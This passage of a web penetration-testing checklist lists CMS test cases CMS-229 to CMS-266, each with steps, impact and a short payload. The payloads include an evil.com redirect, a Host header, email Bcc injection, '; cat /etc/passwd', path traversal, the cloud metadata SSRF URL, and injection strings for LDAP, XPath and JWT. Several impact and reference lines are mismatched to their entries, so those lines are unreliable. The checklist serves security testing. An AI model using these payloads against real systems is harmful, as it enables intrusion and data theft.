**Test Steps:** 1. Append static extension to dynamic URL 2. Cache sensitive page 3. Access cached data

**Expected Result:** Dynamic pages should not be cached

**Payload Example:**

```
/admin/settings/anything.css
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## CMS-229 — Open Redirect
**Test Category:** Open Redirect · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find redirect parameter 2. Inject external URL 3. Redirect users

**Expected Result:** Redirects should validate destinations

**Payload Example:**

```
?redirect=https://evil.com
```

**Impact:** Open redirect -&gt; OAuth code/token theft, credible phishing on the trusted origin.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-601; -&gt;[Open Redirect checklist](#/checklist/openredir); PortSwigger; PayloadsAllTheThings

---

## CMS-230 — JWT Token Manipulation
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Capture JWT 2. Modify claims 3. Access as different user

**Expected Result:** JWT should be properly validated

**Payload Example:**

```
{"alg":"none"} or modify user_id claim
```

**Impact:** JWT forgery/verification flaw -&gt; identity spoofing, privilege escalation, full account takeover.

**Tools:** jwt_tool / Burp Suite JWT Editor

**References:** CWE-347; -&gt;[JWT checklist](#/checklist/jwt); Auth0 JWT library vulns; PortSwigger JWT

---

## CMS-231 — Insecure Deserialization
**Test Category:** Remote Code Execution · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find serialized data 2. Modify serialized object 3. Execute code

**Expected Result:** Deserialization should be avoided

**Payload Example:**

```
PHP/Java/Python serialized payloads
```

**Impact:** Insecure deserialization -&gt; remote code execution.

**Tools:** ysoserial / phpggc / Burp Suite

**References:** CWE-502; -&gt;[Insecure Deserialization checklist](#/checklist/deser); Bechler 'Java Unmarshaller Security'; ysoserial

---

## CMS-232 — Log Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Input data appearing in logs 2. Inject log format 3. Forge log entries

**Expected Result:** Logs should sanitize user input

**Payload Example:**

```
input=valid\nForged admin action
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Log Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-233 — Email Header Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find email-sending feature 2. Inject headers 3. Send spam

**Expected Result:** Email fields should be sanitized

**Payload Example:**

```
to=victim@test.com%0ABcc:spam@evil.com
```

**Impact:** CRLF/response-splitting -&gt; header injection, cache poisoning, session fixation.

**Tools:** Burp Suite / Email Analysis

**References:** CWE-113; -&gt;[Host Header Injection checklist](#/checklist/hostheader); OWASP CRLF Injection; PortSwigger

---

## CMS-234 — Subdomain Takeover
**Test Category:** Security Misconfiguration · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Enumerate subdomains 2. Find dangling DNS 3. Claim abandoned subdomain

**Expected Result:** All subdomains should be configured

**Payload Example:**

```
cms-staging.company.com pointing to unclaimed service
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Subjack / Can-I-Take-Over-XYZ

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## CMS-235 — XML-RPC Exploitation
**Test Category:** Remote Code Execution · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find XML-RPC endpoint 2. Test for vulnerabilities 3. Exploit XML-RPC

**Expected Result:** XML-RPC should be disabled or secured

**Payload Example:**

```
xmlrpc.php exploitation
```

**Impact:** Code/command execution -&gt; full server compromise.

**Tools:** WPScan / Burp Suite

**References:** CWE-94; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger; OWASP

---

## CMS-236 — RSS/Atom Feed Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Control content in feed 2. Inject XSS 3. Execute in feed readers

**Expected Result:** Feed content should be sanitized

**Payload Example:**

```
<script> in RSS description
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / Feed Readers

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## CMS-237 — Sitemap Information Disclosure
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Access sitemap.xml 2. Find hidden URLs 3. Discover internal pages

**Expected Result:** Sitemap should not reveal private URLs

**Payload Example:**

```
Private admin URLs in sitemap
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-238 — robots.txt Information Disclosure
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Access robots.txt 2. Find disallowed paths 3. Access hidden directories

**Expected Result:** Disallow does not mean protected

**Payload Example:**

```
/admin/ /backup/ in robots.txt
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-239 — Error Page Information Leak
**Test Category:** Information Disclosure · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Trigger errors 2. Analyze error pages 3. Extract version/path info

**Expected Result:** Errors should be generic

**Payload Example:**

```
CMS version or file paths in errors
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Error Triggering

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-240 — Version Disclosure
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Check response headers 2. View page source 3. Find CMS version

**Expected Result:** Version should not be disclosed

**Payload Example:**

```
X-Powered-By: CMS v1.2.3
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-241 — Autocomplete on Sensitive Fields
**Test Category:** Security Misconfiguration · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Analyze admin forms 2. Check autocomplete attribute 3. Find cached credentials

**Expected Result:** Sensitive fields should disable autocomplete

**Payload Example:**

```
autocomplete="on" for password fields
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Browser DevTools / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## CMS-242 — Missing Security Headers
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Analyze response headers 2. Check for missing headers 3. Identify vulnerabilities

**Expected Result:** All security headers should be set

**Payload Example:**

```
Missing X-Frame-Options/CSP/HSTS
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Security Headers Scanner / Burp Suite

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## CMS-243 — Insecure Cookie Flags
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Analyze cookies 2. Check security flags 3. Identify vulnerable cookies

**Expected Result:** Cookies should have security flags

**Payload Example:**

```
Missing Secure/HttpOnly/SameSite
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Burp Suite / Browser DevTools

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## CMS-244 — Host Header Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Modify Host header 2. Check for injection 3. Cache poisoning or password reset

**Expected Result:** Host header should be validated

**Payload Example:**

```
Host: evil.com in requests
```

**Impact:** Host-header injection into this flow -&gt; password-reset poisoning / cache poisoning -&gt; account takeover.

**Tools:** Burp Suite / curl

**References:** CWE-644; -&gt;[Host Header Injection checklist](#/checklist/hostheader); James Kettle Practical Web Cache Poisoning

---

## CMS-245 — Server-Side Request Forgery
**Test Category:** Server-Side Request Forgery · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find URL fetch feature 2. Provide internal URL 3. Access internal services

**Expected Result:** URL fetching should validate destinations

**Payload Example:**

```
http://169.254.169.254/latest/meta-data/
```

**Impact:** SSRF -&gt; internal-service reach / cloud metadata credential theft.

**Tools:** Burp Suite / SSRFmap

**References:** CWE-918; -&gt;[SSRF checklist](#/checklist/ssrf); Orange Tsai 'A New Era of SSRF'; PortSwigger

---

## CMS-246 — Command Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find feature executing commands 2. Inject OS commands 3. Execute on server

**Expected Result:** User input should never reach shell

**Payload Example:**

```
; cat /etc/passwd or | whoami
```

**Impact:** OS command injection -&gt; remote code execution / server takeover.

**Tools:** Burp Suite / Commix

**References:** CWE-78; -&gt;[Command Injection checklist](#/checklist/cmdi); PortSwigger OS command injection; GTFOBins

---

## CMS-247 — LDAP Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find LDAP authentication 2. Inject LDAP payload 3. Bypass auth

**Expected Result:** LDAP queries should be escaped

**Payload Example:**

```
username=*)(|(uid=*
```

**Impact:** LDAP filter injection -&gt; authentication bypass / directory data disclosure.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-90; -&gt;[LDAP Injection checklist](#/checklist/ldap); OWASP LDAP Injection; PayloadsAllTheThings

---

## CMS-248 — XPath Injection
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find XML/XPath processing 2. Inject XPath payload 3. Extract data

**Expected Result:** XPath queries should be parameterized

**Payload Example:**

```
' or '1'='1
```

**Impact:** XPath injection -&gt; authentication bypass / XML store disclosure.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-643; -&gt;[XPath Injection checklist](#/checklist/xpath); OWASP XPath Injection

---

## CMS-249 — Second-Order SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Store payload in content 2. Trigger processing using stored data 3. Delayed SQL execution

**Expected Result:** All data usage should be parameterized

**Payload Example:**

```
Payload stored then used in report generation
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite / Manual Testing

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## CMS-250 — Timing Attack on Authentication
**Test Category:** Information Disclosure · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Measure login response times 2. Compare valid vs invalid users 3. Enumerate users

**Expected Result:** Response time should be constant

**Payload Example:**

```
Timing difference revealing valid usernames
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-251 — Race Condition on Content Publication
**Test Category:** Race Condition · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Rapidly publish/unpublish 2. Create inconsistent state 3. Bypass workflow

**Expected Result:** Publication should be atomic

**Payload Example:**

```
Parallel publish requests
```

**Impact:** Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend).

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine

---

## CMS-252 — File Inclusion via Theme
**Test Category:** Local File Inclusion · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find theme parameter 2. Inject path traversal 3. Include sensitive files

**Expected Result:** Theme loading should be restricted

**Payload Example:**

```
theme=../../../etc/passwd
```

**Impact:** Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE.

**Tools:** Burp Suite / DotDotPwn

**References:** CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai

---

## CMS-253 — Prototype Pollution
**Test Category:** Injection · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Send JSON with __proto__ 2. Pollute object prototype 3. Exploit pollution

**Expected Result:** Prototype pollution should be prevented

**Payload Example:**

```
{"__proto__":{"admin":true}}
```

**Impact:** Prototype pollution -&gt; DOM XSS (client) / RCE (server).

**Tools:** Burp Suite / Postman

**References:** CWE-1321; -&gt;[Prototype Pollution checklist](#/checklist/prototype); Olivier Arteau; PortSwigger server-side PP

---

## CMS-254 — Mass Assignment in User Profile
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Update profile 2. Add role parameter 3. Escalate privileges

**Expected Result:** Only allowed fields should be accepted

**Payload Example:**

```
{"name":"test",is_admin:true}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## CMS-255 — Insufficient Logging
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Perform malicious actions 2. Check audit logs 3. Actions not logged

**Expected Result:** Security events should be logged

**Payload Example:**

```
Missing logs for sensitive operations
```

**Impact:** Security misconfiguration -&gt; weakened control exploitable via the mapped attack.

**Tools:** Manual Review / Log Analysis

**References:** CWE-16; OWASP Security Misconfiguration (A05)

---

## CMS-256 — Backup Code Brute Force
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find 2FA backup code entry 2. Brute force codes 3. Bypass 2FA

**Expected Result:** Backup code attempts should be limited

**Payload Example:**

```
Iterate through common backup codes
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite Intruder / Custom Scripts

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## CMS-257 — OAuth Implementation Flaws
**Test Category:** Broken Authentication · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Analyze OAuth flow 2. Find state/redirect issues 3. Account takeover

**Expected Result:** OAuth should be properly implemented

**Payload Example:**

```
Missing state parameter or open redirect
```

**Impact:** OAuth/SSO flaw -&gt; code/token theft or identity confusion -&gt; account takeover.

**Tools:** Burp Suite / OAuth Tools

**References:** CWE-287; -&gt;[OAuth / OIDC / SAML checklist](#/checklist/oauth); OAuth Security BCP (RFC 9700); PortSwigger

---

## CMS-258 — API Versioning Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find old API version 2. Bypass new security 3. Access vulnerable endpoint

**Expected Result:** Old APIs should be secured

**Payload Example:**

```
/api/v1/admin bypassing v2 security
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-259 — Content Delivery Network Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Find origin server 2. Bypass CDN protection 3. Direct access

**Expected Result:** Origin should be protected

**Payload Example:**

```
Direct access bypassing WAF/CDN
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Shodan / DNS Analysis / Burp Suite

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-260 — Rate Limiting Bypass
**Test Category:** Security Misconfiguration · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Hit rate limit 2. Bypass via headers 3. Continue abuse

**Expected Result:** Rate limiting should be robust

**Payload Example:**

```
X-Forwarded-For rotation
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / IP Rotate

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## CMS-261 — WebSocket Security Issues
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Connect to WebSocket 2. Send unauthorized commands 3. Access data

**Expected Result:** WebSocket should require auth

**Payload Example:**

```
WS connection without authentication
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / WS King

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## CMS-262 — Git Repository Exposure
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Access /.git/ 2. Download repository 3. Extract source code

**Expected Result:** Git directories should not be accessible

**Payload Example:**

```
/.git/config or /.git/HEAD
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / GitTools / git-dumper

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-263 — SVN Repository Exposure
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Access /.svn/ 2. Download repository 3. Extract source code

**Expected Result:** SVN directories should not be accessible

**Payload Example:**

```
/.svn/entries or /.svn/wc.db
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / SVN Tools

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-264 — Environment File Exposure
**Test Category:** Information Disclosure · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Access .env file 2. Extract credentials 3. Use for further access

**Expected Result:** Environment files should be protected

**Payload Example:**

```
/.env or /.env.backup
```

**Impact:** Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack.

**Tools:** Burp Suite / ffuf

**References:** CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger

---

## CMS-265 — Denial of Service via Search
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Submit complex search query 2. Exhaust database resources 3. Service degradation

**Expected Result:** Search should be optimized and limited

**Payload Example:**

```
Complex regex or wildcard search
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---

## CMS-266 — Memory Exhaustion Attack
**Test Category:** Denial of Service · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** General CMS Security

**Test Steps:** 1. Submit data causing memory allocation 2. Exhaust server memory 3. Service crash

**Expected Result:** Memory usage should be limited

**Payload Example:**

```
Deeply nested JSON or XML
```

**Impact:** Denial of service -&gt; availability impact for this feature / the app.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-400; -&gt;[Race Condition checklist](#/checklist/racecondition); OWASP; PortSwigger

---
